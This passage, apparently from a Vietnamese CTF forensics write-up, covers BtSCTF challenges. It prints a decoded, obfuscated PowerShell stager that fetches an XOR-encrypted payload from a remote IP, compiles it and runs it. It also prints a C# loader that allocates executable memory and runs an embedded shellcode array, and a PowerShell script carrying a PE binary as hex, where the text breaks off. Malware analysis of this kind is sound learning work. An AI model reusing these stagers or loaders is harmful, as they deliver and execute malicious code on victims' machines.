116,55,84,80,79,101,51,125,37,121,9,98,37,112,17,124,111,57,84,110,92,51,81,108,79,61,11,64,76,122,41,115,107,51,17,126,62,112,48,81,65,60,13,89,103,37,6,39,67,30,84,64,110,127,78,63,37,47,65,82,93,6,33,64,54,19,47,115,64,99,2,121,107,49,62,50,80,19,33,126,109,27,7,103,102,101,35,92,52,2,14,75,37,105,69,50,113,62,15,123,52,44,60,113,49,46,47,127,107,2,44,77,33,1,34,82,109,60,42,116,116,55,84,80,79,101,51,125,88,116,72,116,125,59,23,54,33,32,80,97,79,6,60,122,112,62,82,114,53,61,0,64,62,112,17,35,114,30,55,79,105,33,15,33,97,100,12,115,83,116,88,54,33,32,80,97,79,6,60,122,112,62,82,114,53,61,0,64,37,121,7,110,106,38,69,37,50,116,72,116,125,59,23,54,45,112,48,81,65,60,13,89,103,37,6,39,67,30,84,64,110,116,64,54,53,44,39,84,44,116,24,45,119,49,17,99,119,58,69,50,65,12,55,82,83,103,34,92,96,17,82,113,106,58,0,107,62,15,7,111,113,49,62,75,88,116,65,80,67,36,20,123,86,18,4,116,109,58,22,36,61,102,69,43,37,98,82,58,48,108,73,47,55,120,93,33,41,101,85,35,41,101,84,38,41,101,85,38,41,101,84,39,41,101,84,47,41,101,84,35,41,109,87,58,50,99,73,39,53,97,73,47,60,120,84,39,49,120,84,39,52,120,84,39,48,120,84,39,52,120,84,38,55,120,84,39,51,120,81,32,41,99,93,58,51,109,73,46,49,120,92,36,41,99,85,58,52,101,81,58,60,99,73,39,53,109,73,39,53,101,73,39,52,109,73,39,52,101,73,39,52,96,73,39,53,99,94,50,93,37,21,94,51,37,6,126,127,5,31,110,100,29,9,54,56,116,77,113,102,61,69,62,33,109,93,67,125,3,39,67,61,53,60,34,74,30,35,92,43,19,0,98,86,32,23,127,107,51,77,50,67,18,21,103,104,7,35,119,103,60,11,101,55,108,87,63,44,116,72,68,37,121,35,127,37,124,57,52,126,96,24,109,51,41,30,39,120,47,86,107,126,97,24,109,55,41,30,38,120,8,71,54,40,50,69,49,96,115,73,49,102,115,73,49,125,115,73,49,43,115,73,49,102,115,73,49,96,115,73,49,118,115,76,63,62,61,3,54,45,112,11,99,105,56,69,59,96,37,69,50,93,37,21,94,51,37,6,126,127,5,31,110,100,29,9,56,64,44,12,101,113,39,76,54,126,49,29,127,113,41,69,115,105,39,0,54,126,112,61,103,117,28,83,103,102,60,31,71,127,44,4,95,105,116,88,54,33,12,20,102,77,98,20,117,109,46,52,108,125,53,44,122,43,18,16,122,105,26,4,123,96,41,94,50,81,13,51,110,71,61,54,88,50,24,60,70,52,22,86,54,56,116,77,127,114,38,69,74,39,112,30,32,98,13,12,84,100,30,11,66,84,55,40,87,87,45,24,44,33,47,33,84,67,35,22,97,109,51,60,93,107,23,18,110,79,41,74,50,126,19,53,123,105,25,81,95,50,24,51,69,80,27,92,98,120,8,71,54,40,1,22,115,71,53,22,127,102,4,4,100,118,61,11,113,44,122,38,121,107,32,0,120,113,111,65,66,92,2,29,84,108,7,43,33,73,13,53,39,71,103,69,43,37,25,39,47,64,6,51,112,60,38,12,88,87,57,16,97,37,112,49,79,83,44,39,127,86,26,82,90,92,4,84,84,54,111,65,32,99,26,38,82,64,53,35,123,71,109,9,117,74,51,69,43,37,8,71,50,126,17,11,96,63,0,32,91,85,41,57,115,100,109,93,117,111,57,0,74,39,111,65,80,103,4,44,82,74,98,85,121,100,58,20,82,50,63,69,43,37,8,71,57,106,33,17,44,33,47,32,120,115,110,49,83,72,4,24,74,96,53,92,46,102,62,8,115,43,49,29,115,89,118,94,69,96,32,72,85,106,58,17,115,107,32,69,59,85,53,17,126,37,112,83,112,75,23,33,83,100,18,8,84,60,56,6,89,98,116,72,64,100,56,16,115,37,112,49,79,83,44,39,127,86,26,82,90,92,4,84,84,54,116,72,83,107,55,10,114,108,58,2,54,71,45,17,115,37,121,43,121,75,49,18,122,108,58,0,45,35,116,65,78,116,36,45,32,116,55,13,108,84,46,29,119,76,56,69,50,67,54,53,95,65,27,83,38,106,53,11,103,65,99,14,54,33,98,3,88,70,16,32,119,67,57,39,47,105,55,42,113,62,114,69,74,39,112,30,83,107,34,95,66,64,25,53,107,89,49,4,47,61,55,15,123,96,122,0,110,96,8,71,45,119,57,69,50,51,50,43,85,65,17,4,80,104,22,92,122,102,27,2,107,39\u0026#34; decoded_bytes = main(alternative_text) print(decoded_bytes) Sau đó ta có được một đoạn mã mới,trông có vẻ khá lộn xộn:\nbytearray(b\u0026#39;powershell -Command \u0026#34;Invoke-Command -ScriptBlock {$6gYiBaJnTQcMARy = \\\\\u0026#34;192.168.56.1\\\\\u0026#34;;$DBFwswhgYKnCwxJ = (123974 - 152030 + 28874 + 519);$GPmlM4I7LVSUO9t = (\\\\\u0026#34;{3}{1}{4}{5}{0}{2}\\\\\u0026#34;-f\\\u0026#39;d5\\\u0026#39;,\\\u0026#39;d9\\\u0026#39;,\\\u0026#39;d2\\\u0026#39;,\\\u0026#39;d9\\\u0026#39;,\\\u0026#39;de\\\u0026#39;,\\\u0026#39;c9\\\u0026#39;); $98UxWBU8aY4OJFJ = [System.Text.Encoding]::UTF8; function MB9ERVf9riNRmuw {param ([byte[]] $tjjm1xYg4zJinVI); $DXRDV3GJeE7gone = New-Object byte[] $tjjm1xYg4zJinVI.Length; $t5wJRYluj7d0ieV = 13; for ($UGDhhObqc1FJ1Vk = 0; $UGDhhObqc1FJ1Vk -lt $tjjm1xYg4zJinVI.Length; $UGDhhObqc1FJ1Vk++) {$DXRDV3GJeE7gone[$UGDhhObqc1FJ1Vk] = $tjjm1xYg4zJinVI[$UGDhhObqc1FJ1Vk] -bxor $t5wJRYluj7d0ieV; $t5wJRYluj7d0ieV = $t5wJRYluj7d0ieV -bxor 37 -bxor ($UGDhhObqc1FJ1Vk % 0xBB) }; return $DXRDV3GJeE7gone}; [byte[]] $FFpqmSFabhns282 = 67,58,92,87,105,110,100,111,119,115,92,77,105,99,114,111,115,111,102,116,46,78,69,84,92,70,114,97,109,101,119,111,114,107; $XqpH6qchzQzxaIl = (gci ($98UxWBU8aY4OJFJ.GetString($FFpqmSFabhns282)) -R -Fi (\\\\\u0026#34;{4}{6}{1}{3}{5}{2}{0}\\\\\u0026#34; -f \\\u0026#39;e\\\u0026#39;,\\\u0026#39;c\\\u0026#39;,\\\u0026#39;x\\\u0026#39;,\\\u0026#39;.\\\u0026#39;,\\\u0026#39;c\\\u0026#39;,\\\u0026#39;e\\\u0026#39;,\\\u0026#39;s\\\u0026#39;)); if ($null -eq $XqpH6qchzQzxaIl.Exists) {exit} else {$XqpH6qchzQzxaIl = $XqpH6qchzQzxaIl.FullName}; $TYVxBiSN7LYP1B3 = (iwr \\\\\u0026#34;${6gYiBaJnTQcMARy}:${DBFwswhgYKnCwxJ}/${GPmlM4I7LVSUO9t}\\\\\u0026#34; -UseBasicParsing).Content; $TYVxBiSN7LYP1B3 = MB9ERVf9riNRmuw $TYVxBiSN7LYP1B3; $6fNCDEaFmB9lcOg = \\\\\u0026#34;${Env:TEMP}\\\\ea98cjme\\\\\u0026#34;; $FbPIDO60oanqD7k = \\\\\u0026#34;/out:${Env:TEMP}\\\\ea98cjme.exe\\\\\u0026#34;; Set-Content -Path $6fNCDEaFmB9lcOg -Value $TYVxBiSN7LYP1B3 -Encoding Byte -NoNewline; \u0026amp; $XqpH6qchzQzxaIl $FbPIDO60oanqD7k $6fNCDEaFmB9lcOg; \u0026amp; \\\\\u0026#34;${Env:TEMP}\\\\ea98cjme.exe\\\\\u0026#34;; rm $6fNCDEaFmB9lcOg}\u0026#34;\u0026#39;) Mã PowerShell này thực hiện các bước sau:\n1. Tạo các biến: - $6gYiBaJnTQcMARy chứa địa chỉ IP (\u0026#34;192.168.56.1\u0026#34;). $DBFwswhgYKnCwxJ là một số (123974 - 152030 + 28874 + 519). - $GPmlM4I7LVSUO9t là một chuỗi được tạo từ các ký tự hex (\u0026#39;d5\u0026#39;, \u0026#39;d9\u0026#39;, \u0026#39;d2\u0026#39;, \u0026#39;d9\u0026#39;, \u0026#39;de\u0026#39;, \u0026#39;c9\u0026#39;) với định dạng (\u0026#34;{3}{1}{4}{5}{0}{2}\u0026#34;). 2. Định nghĩa hàm MB9ERVf9riNRmuw: - Hàm này nhận đầu vào là một mảng byte và thực hiện phép XOR với một giá trị ($t5wJRYluj7d0ieV), sau đó trả về mảng byte đã được giải mã. 3. Tạo một mảng byte $FFpqmSFabhns282: - Mảng byte này chứa giá trị của chuỗi (\u0026#34;C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\System.Runtime.InteropServices.dll\u0026#34;). 4. Tìm đường dẫn file .dll: - Dùng lệnh gci để tìm file .dll theo đường dẫn từ mảng byte đã được chuyển đổi thành chuỗi. 5. Kiểm tra sự tồn tại của file: - Nếu file không tồn tại ($null -eq $XqpH6qchzQzxaIl.Exists), script sẽ thoát. Nếu file tồn tại, lấy tên đầy đủ của file. 6. Tải dữ liệu từ URL: - Dữ liệu từ URL (\u0026#34;${6gYiBaJnTQcMARy}:${DBFwswhgYKnCwxJ}/${GPmlM4I7LVSUO9t}\u0026#34;) được tải xuống và lưu vào biến $TYVxBiSN7LYP1B3. 7.Giải mã dữ liệu: - Dữ liệu từ URL được giải mã bằng hàm MB9ERVf9riNRmuw. 8. Lưu và thực thi file: - Dữ liệu giải mã được lưu vào tệp ea98cjme trong thư mục temp của hệ thống. - Chạy file thực thi (ea98cjme.exe) và xóa tệp tạm (ea98cjme). File mà ta cần có để giải mã ở đây là d9d9dec9d5d2. Mình extract nó ra từ file pcapng tương tự như file .docm.\ndef decrypt(buffer): out = bytearray() xor_key = 13 for i, byte in enumerate(buffer): out.append(byte ^ xor_key) xor_key = xor_key ^ 37 ^ (i % 0xBB) return out with open(\u0026#34;d9d9dec9d5d2\u0026#34;, \u0026#34;rb\u0026#34;) as f: enc = f.read() decrypted_data = decrypt(enc) with open(\u0026#34;output.exe\u0026#34;, \u0026#34;wb\u0026#34;) as f: f.write(decrypted_data) print(\u0026#34;File đã được giải mã và lưu vào output.exe\u0026#34;) Sau đó ta có được file output.exe như sau:\nusing System; using System.Runtime.InteropServices; class Program { [DllImport(\u0026#34;kernel32.dll\u0026#34;, SetLastError = true)] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [DllImport(\u0026#34;kernel32.dll\u0026#34;)] public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType); [DllImport(\u0026#34;kernel32.dll\u0026#34;)] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId); [DllImport(\u0026#34;kernel32.dll\u0026#34;)] public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds); public static void Main() { byte[] buf = new byte[] {0xd9,0xec,0xbb,0xe9,0xaf,0xc8,0xb5,0xd9,0x74,0x24,0xf4,0x5f,0x33,0xc9,0xb1,0x87,0x31,0x5f,0x1a,0x83,0xc7,0x04,0x03,0x5f,0x16,0xe2,0x1c,0x74,0x1b,0x6c,0xaa,0xaf,0x68,0x37,0x99,0x35,0x23,0x7f,0x43,0x05,0x8d,0x31,0xfa,0x58,0x4b,0x25,0xff,0xdc,0x44,0xca,0xda,0x99,0x3b,0x0e,0x44,0x32,0xf3,0xd7,0x32,0x5b,0xc0,0xc1,0x1b,0x73,0x18,0x67,0x3f,0xf2,0x18,0x75,0xf8,0x25,0xbc,0x04,0x61,0xf3,0xe4,0xd5,0x95,0x58,0x7f,0x02,0x31,0x14,0xe9,0xa0,0xe0,0x01,0x43,0xaa,0xb6,0xd1,0xb7,0xae,0xd4,0x58,0xdd,0xb3,0x96,0x0c,0x26,0xfc,0xb5,0xbd,0xa3,0x15,0x58,0xe2,0xf9,0x3a,0x85,0x06,0xc7,0x16,0x86,0xe6,0x06,0x7a,0x45,0x69,0x8d,0xb2,0x29,0x69,0x23,0xd9,0xac,0x22,0xaf,0x70,0x03,0x7c,0x9c,0x68,0x1d,0x5f,0x86,0x97,0xc6,0x0b,0xd7,0x30,0x2e,0xab,0x22,0x85,0x02,0xc8,0x61,0xea,0xa4,0xf8,0x8d,0x5e,0xa4,0x42,0x07,0x69,0xd6,0x8f,0x60,0x78,0x64,0x98,0xcd,0x4b,0x24,0xcc,0x31,0x7a,0xaa,0xea,0x55,0x2e,0xe1,0x5b,0xec,0x07,0x59,0x2c,0xc5,0x02,0x17,0x74,0x55,0x34,0xf7,0xf5,0xd1,0xe7,0xb5,0xa1,0x65,0x2e,0x3b,0x6b,0x9c,0xc7,0xde,0xc4,0xf3,0x63,0xd5,0x7f,0x2b,0x59,0xf3,0x34,0xdb,0x14,0xe4,0x85,0xb7,0x20,0x3d,0x5d,0xc0,0xff,0x55,0x20,0xc7,0x28,0x92,0x9f,0xe0,0x61,0x89,0xa0,0x89,0x4b,0x65,0xf6,0x8b,0xda,0xf5,0xde,0x7c,0x87,0x14,0x55,0xf2,0xfd,0x11,0xf4,0xa5,0x1c,0x32,0x55,0xcf,0x38,0x23,0x99,0xc6,0x37,0x28,0x8d,0xfa,0x93,0xa4,0x87,0x18,0x2a,0xfc,0x36,0x65,0x1b,0xea,0x95,0x5b,0xcc,0xd7,0x33,0x4a,0x96,0x84,0x85,0x15,0x4a,0x8f,0xac,0xeb,0xe6,0x73,0x94,0xa2,0x42,0x8e,0xc8,0x85,0x1e,0x38,0x5e,0x86,0x39,0x8a,0x15,0xc9,0xdc,0x96,0xbc,0x53,0xdc,0x3a,0xda,0x3b,0x5a,0x83,0x00,0x74,0x0e,0xa5,0x58,0xf1,0x3d,0xe8,0x79,0xed,0xc0,0x1a,0xaf,0x13,0xb4,0x26,0x76,0xae,0xb5,0x1f,0x95,0x41,0x11,0x7a,0x2b,0x7a,0xcf,0x12,0xad,0x10,0x4a,0xce,0xea,0x64,0xbb,0x98,0x3e,0x28,0x40,0x55,0x2d,0x72,0x3b,0x5e,0x6c,0x75,0xaa,0xab,0x37,0x9d,0xc2,0x77,0x81,0x8e,0x0c,0x96,0x4c,0xde,0x30,0xaf,0x1b,0xa9,0x78,0xee,0x3e,0xca,0x55,0x52,0x05,0x10,0x01,0xe2,0xad,0x8e,0x0a,0xee,0x15,0x57,0xa3,0xb3,0x1a,0x5d,0xec,0x6a,0x31,0x28,0x68,0x7a,0x1f,0x77,0x96,0xac,0x33,0x5a,0xcd,0x5b,0x23,0x83,0xb0,0xba,0x18,0xed,0xa8,0x26,0xe8,0x93,0x09,0x46,0x22,0xaf,0x11,0x90,0xe9,0xf1,0xaf,0xf9,0x79,0x1b,0x2e,0xd6,0x5d,0x22,0xa8,0x50,0x1f,0x54,0x0e,0x87,0x63,0x7e,0x3d,0xe6,0x3f,0x6b,0xe6,0xff,0x67,0xe6,0x02,0x85,0xca,0x27,0xe9,0xe0,0xe3,0xd8,0x76,0xcb,0x8f,0x5b,0xe2,0xbb,0x88,0x05,0xce,0xb2,0xed,0xfb,0xea,0x5f,0x7c,0x5a,0x71,0x31,0x25,0xac,0x42,0x6f,0x1f,0xdb,0x9b,0x34,0x43,0x58,0x2b,0xd8,0x32,0x2c,0x20,0x45,0x4f,0x9e,0xc4,0x54,0xe4,0xe7,0xee,0x8b,0xab,0x98,0xef,0x06,0x4d,0x12,0x90,0xb4,0xb7,0xc0,0x81,0x68,0x83,0xdb,0x07,0x0c,0x00,0x10,0x8e,0x3c,0x48,0xd0,0x07,0xb2,0x78,0x72,0x92,0x76,0x65,0x64,0x24,0x78,0xa8,0x8a,0xf8,0x52,0x7d,0xff,0x43,0xdd,0x7f,0xb6,0x20,0xd2,0xac,0xa8,0xd6,0x30,0xfe,0x5d,0x51,0xf5,0x21,0x34,0x5b,0xab,0xfc,0xd9,0x43,0x5d,0xb2,0x79,0x0c,0xa8,0xc6,0x5c,0xc3,0x39,0xef,0x3a,0xb7}; IntPtr allocMemAddress = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x1000 | 0x2000, 0x40); Marshal.Copy(buf, 0, allocMemAddress, buf.Length); uint threadId; IntPtr hThread = CreateThread(IntPtr.Zero, 0, allocMemAddress, IntPtr.Zero, 0, out threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); } } Sau khi compile thì mình thử run trên cả ANY.RUN và máy ảo mà không được, nên đành bó tay tại đây. Sau đó mình đọc bài WU này và biết phải dùng scdbg. Đầu tiên phải decode toàn bộ mã hex trong code thành file bin. Bạn có thể sử dụng Cyberchef, chỉ cần copy nguyên đoạn mã hex là được. Sau đó chạy scdbg, ta nhận được cờ.\nFLAG: BtSCTF{VbA_+_P0wer5h3ll_=_\u0026lt;3!!!}\n2.For/BTS Antivirus # I realised that something was wrong with that free flag document, so I decided to download an antivirus. It worked well - maybe too well, because it seems to have encrypted all my files. I don\u0026rsquo;t really know how to feel about that - maybe it\u0026rsquo;s for security. I\u0026rsquo;ve captured internet traffic and created a memory dump of the antivirus process. Can you analyze what it really did?\nThử thách cung cấp 1 file .zip và 1 file .pcap. Mở file pcap lên thì tương tự như bài trước, mình thấy 1 file .ps1. Extract nó ra, nội dung của file như sau:\n$sb = { [byte[]] $data = 0x4d,0x5a,0x90,0x00,0x03,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0xff,0xff,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x00,0x00,0x00,0x0e,0x1f,0xba,0x0e,0x00,0xb4,0x09,0xcd,0x21,0xb8,0x01,0x4c,0xcd,0x21,0x54,0x68,0x69,0x73,0x20,0x70,0x72,0x6f,0x67,0x72,0x61,0x6d,0x20,0x63,0x61,0x6e,0x6e,0x6f,0x74,0x20,0x62,0x65,0x20,0x72,0x75,0x6e,0x20,0x69,0x6e,0x20,0x44,0x4f,0x53,0x20,0x6d,0x6f,0x64,0x65,0x2e,0x0d,0x0d,0x0a,0x24,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x50,0x45,0x00,0x00,0x4c,0x01,0x03,0x00,0x94,0xea,0xe8,0xa9,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xe0,0x00,0x22,0x20,0x0b,0x01,0x30,0x00,0x00,0x16,0x00,0x00,0x00,0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x1a,0x34,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x20,0x00,0x00,0x00,0x02,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x60,0x85,0x00,0x00,0x10,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xc8,0x33,0x00,0x00,0x4f,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x70,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x00,0x0c,0x00,0x00,0x00,0xec,0x32,0x00,0x00,0x54,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08,0x20,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x2e,0x74,0x65,0x78,0x74,0x00,0x00,0x00,0x20,0x14,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x16,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x60,0x2e,0x72,0x73,0x72,0x63,0x00,0x00,0x00,0x70,0x03,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x18,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x40,0x2e,0x72,0x65,0x6c,0x6f,0x63,0x00,0x00,0x0c,0x00,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x1c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x42,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xfc,0x33,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x02,0x00,0x05,0x00,0xa8,0x23,0x00,0x00,0x44,0x0f,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x1b,0x30,0x03,0x00,0x42,0x00,0x00,0x00,0x01,0x00,0x00,0x11,0x00,0x73,0x0f,0x00,0x00,0x0a,0x0a,0x06,0x03,0x17,0x73,0x10,0x00,0x00,0x0a,0x0b,0x07,0x73,0x11,0x00,0x00,0x0a,0x0c,0x08,0x02,0x6f,0x12,0x00,0x00,0x0a,0x00,0xde,0x0b,0x08,0x2c,0x07,0x08,0x6f,0x13,0x00,0x00,0x0a,0x00,0xdc,0x06,0x6f,0x14,0x00,0x00,0x0a,0x0d,0xde,0x0b,0x07,0x2c,0x07,0x07,0x6f,0x13,0x00,0x00,0x0a,0x00,0xdc,0x09,0x2a,0x00,0x00,0x01,0x1c,0x00,0x00,0x02,0x00,0x17,0x00,0x0a,0x21,0x00,0x0b,0x00,0x00,0x00,0x00,0x02,0x00,0x10,0x00,0x25,0x35,0x00,0x0b,0x00,0x00,0x00,0x00,0x1b,0x30,0x03,0x00,0x39,0x00,0x00,0x00,0x02,0x00,0x00,0x11,0x00,0x02,0x73,0x15,0x00,0x00,0x0a,0x0a,0x06,0x03,0x16,0x73,0x10,0x00,0x00,0x0a,0x0b,0x07,0x73,0x16,0x00,0x00,0x0a,0x0c,0x08,0x6f,0x17,0x00,0x00,0x0a,0x0d,0xde,0x16,0x08,0x2c,0x07,0x08,0x6f,0x13,0x00,0x00,0x0a,0x00,0xdc,0x07,0x2c,0x07,0x07,0x6f,0x13,0x00,0x00,0x0a,0x00,0xdc,0x09,0x2a,0x00,0x00,0x00,0x01,0x1c,0x00,0x00,0x02,0x00,0x18,0x00,0x09,0x21,0x00,0x0b,0x00,0x00,0x00,0x00,0x02,0x00,0x11,0x00,0x1b,0x2c,0x00,0x0b,0x00,0x00,0x00,0x00,0x1b,0x30,0x05,0x00,0x67,0x01,0x00,0x00,0x03,0x00,0x00,0x11,0x00,0x28,0x18,0x00,0x00,0x0a,0x0a,0x7e,0x02,0x00,0x00,0x04,0x25,0x2d,0x17,0x26,0x7e,0x01,0x00,0x00,0x04,0xfe,0x06,0x08,0x00,0x00,0x06,0x73,0x19,0x00,0x00,0x0a,0x25,0x80,0x02,0x00,0x00,0x04,0x28,0x1a,0x00,0x00,0x0a,0x00,0x06,0x73,0x1b,0x00,0x00,0x0a,0x72,0x01,0x00,0x00,0x70,0x28,0x1c,0x00,0x00,0x0a,0x6f,0x1d,0x00,0x00,0x0a,0x00,0x06,0x28,0x1e,0x00,0x00,0x0a,0x72,0x45,0x00,0x00,0x70,0x6f,0x1f,0x00,0x00,0x0a,0x6f,0x20,0x00,0x00,0x0a,0x00,0x06,0x17,0x6f,0x21,0x00,0x00,0x0a,0x00,0x06,0x06,0x6f,0x22,0x00,0x00,0x0a,0x06,0x6f,0x23,0x00,0x00,0x0a,0x6f,0x24,0x00,0x00,0x0a,0x0b,0x06,0x06,0x6f,0x22,0x00,0x00,0x0a,0x06,0x6f,0x23,0x00,0x00,0x0a,0x6f,0x25,0x00,0x00,0x0a,0x0c,0x72,0x67,0x00,0x00,0x70,0x20,0xb8,0x22,0x00,0x00,0x73,0x26,0x00,0x00,0x0a,0x0d,0x09,0x6f,0x27,0x00,0x00,0x0a,0x13,0x04,0x20,0x00,0x10,0x00,0x00,0x8d,0x29,0x00,0x00,0x01,0x13,0x05,0x00,0x2b,0x63,0x00,0x11,0x04,0x11,0x05,0x16,0x11,0x05,0x8e,0x69,0x6f,0x28,0x00,0x00,0x0a,0x13,0x06,0x11,0x05,0x11,0x06,0x28,0x01,0x00,0x00,0x2b,0x28,0x02,0x00,0x00,0x2b,0x08,0x28,0x02,0x00,0x00,0x06,0x13,0x07,0x11,0x07,0x28,0x04,0x00,0x00,0x06,0x13,0x08,0x11,0x08,0x07,0x28,0x01,0x00,0x00,0x06,0x13,0x09,0x11,0x09,0x8e,0x69,0x28,0x2b,0x00,0x00,0x0a,0x13,0x0a,0x11,0x04,0x11,0x0a,0x11,0x09,0x28,0x03,0x00,0x00,0x2b,0x28,0x02,0x00,0x00,0x2b,0x16,0x11,0x09,0x8e,0x69,0x1a,0x58,0x6f,0x2d,0x00,0x00,0x0a,0x00,0x00,0x17,0x13,0x0b,0x2b,0x98,0x13,0x0c,0x00,0x11,0x04,0x28,0x1e,0x00,0x00,0x0a,0x11,0x0c,0x6f,0x2e,0x00,0x00,0x0a,0x6f,0x1f,0x00,0x00,0x0a,0x16,0x11,0x0c,0x6f,0x2e,0x00,0x00,0x0a,0x6f,0x2f,0x00,0x00,0x0a,0x6f,0x2d,0x00,0x00,0x0a,0x00,0x00,0xde,0x00,0xde,0x23,0x11,0x04,0x2c,0x08,0x11,0x04,0x6f,0x13,0x00,0x00,0x0a,0x00,0xdc,0x09,0x2c,0x07,0x09,0x6f,0x13,0x00,0x00,0x0a,0x00,0xdc,0x06,0x2c,0x07,0x06,0x6f,0x13,0x00,0x00,0x0a,0x00,0xdc,0x2a,0x00,0x41,0x64,0x00,0x00,0x00,0x00,0x00,0x00,0xaa,0x00,0x00,0x00,0x6b,0x00,0x00,0x00,0x15,0x01,0x00,0x00,0x2c,0x00,0x00,0x00,0x18,0x00,0x00,0x01,0x02,0x00,0x00,0x00,0x9e,0x00,0x00,0x00,0xa5,0x00,0x00,0x00,0x43,0x01,0x00,0x00,0x0d,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x96,0x00,0x00,0x00,0xba,0x00,0x00,0x00,0x50,0x01,0x00,0x00,0x0b,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x54,0x01,0x00,0x00,0x5b,0x01,0x00,0x00,0x0b,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x13,0x30,0x06,0x00,0x71,0x00,0x00,0x00,0x04,0x00,0x00,0x11,0x00,0x73,0x30,0x00,0x00,0x0a,0x25,0x73,0x31,0x00,0x00,0x0a,0x25,0x72,0x81,0x00,0x00,0x70,0x6f,0x32,0x00,0x00,0x0a,0x00,0x25,0x72,0x9f,0x00,0x00,0x70,0x02,0x28,0x33,0x00,0x00,0x0a,0x6f,0x34,0x00,0x00,0x0a,0x00,0x25,0x17,0x6f,0x35,0x00,0x00,0x0a,0x00,0x25,0x16,0x6f,0x36,0x00,0x00,0x0a,0x00,0x25,0x17,0x6f,0x37,0x00,0x00,0x0a,0x00,0x25,0x17,0x6f,0x38,0x00,0x00,0x0a,0x00,0x6f,0x39,0x00,0x00,0x0a,0x00,0x0a,0x06,0x6f,0x3a,0x00,0x00,0x0a,0x26,0x06,0x6f,0x3b,0x00,0x00,0x0a,0x6f,0x17,0x00,0x00,0x0a,0x0b,0x06,0x6f,0x3c,0x00,0x00,0x0a,0x00,0x07,0x0c,0x2b,0x00,0x08,0x2a,0x22,0x02,0x28,0x3d,0x00,0x00,0x0a,0x00,0x2a,0x2e,0x73,0x07,0x00,0x00,0x06,0x80,0x01,0x00,0x00,0x04,0x2a,0x22,0x02,0x28,0x3d,0x00,0x00,0x0a,0x00,0x2a,0x00,0x13,0x30,0x01,0x00,0x07,0x00,0x00,0x00,0x05,0x00,0x00,0x11,0x00,0x17,0x0a,0x2b,0x00,0x06,0x2a,0x00,0x42,0x53,0x4a,0x42,0x01,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x0c,0x00,0x00,0x00,0x76,0x34,0x2e,0x30,0x2e,0x33,0x30,0x33,0x31,0x39,0x00,0x00,0x00,0x00,0x05,0x00,0x6c,0x00,0x00,0x00,0x08,0x05,0x00,0x00,0x23,0x7e,0x00,0x00,0x74,0x05,0x00,0x00,0xc4,0x06,0x00,0x00,0x23,0x53,0x74,0x72,0x69,0x6e,0x67,0x73,0x00,0x00,0x00,0x00,0x38,0x0c,0x00,